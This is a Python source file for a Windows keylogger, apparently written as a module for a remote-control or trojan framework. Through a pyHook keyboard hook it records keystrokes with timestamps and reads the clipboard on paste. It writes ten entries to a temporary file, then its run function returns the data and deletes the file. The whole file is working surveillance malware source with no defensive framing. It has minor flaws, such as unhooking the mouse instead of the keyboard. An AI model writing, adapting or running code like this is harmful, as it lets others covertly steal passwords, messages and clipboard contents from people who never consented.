import pythoncom,pyHook
from datetime import datetime
import os
import threading
import win32clipboard
def run(**args):
    fo = open("outputKey.txt", "w")
    fo.close()
    t = threading.Thread(target=keys,)
    t.start()
    while (os.stat("outputKey.txt").st_size == 0):
        pass
    fi = open("outputKey.txt", "r+")
    data = fi.read()
    fi.close()
    os.remove("outputKey.txt")
    return data
def keys(**args):
    key_list = []
    def onkey(event):
        if(len(key_list) == 10):
            hm.UnhookMouse()
            fo = open("outputKey.txt", "w")
            fo.write(str(key_list))
            fo.close()
            exit(1)
        key_timer = str(datetime.now())
        if event.Ascii > 32 and event.Ascii < 127:
            x = (event.Ascii,key_timer)
        elif event.Key == "V":
            win32clipboard.OpenClipboard()
            paste = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            x = (paste,key_timer)
        else:
            x = (event.Key,key_timer)
        key_list.append(x)
        return True
    hm = pyHook.HookManager()
    hm.KeyDown=onkey
    hm.HookKeyboard()
    pythoncom.PumpMessages()
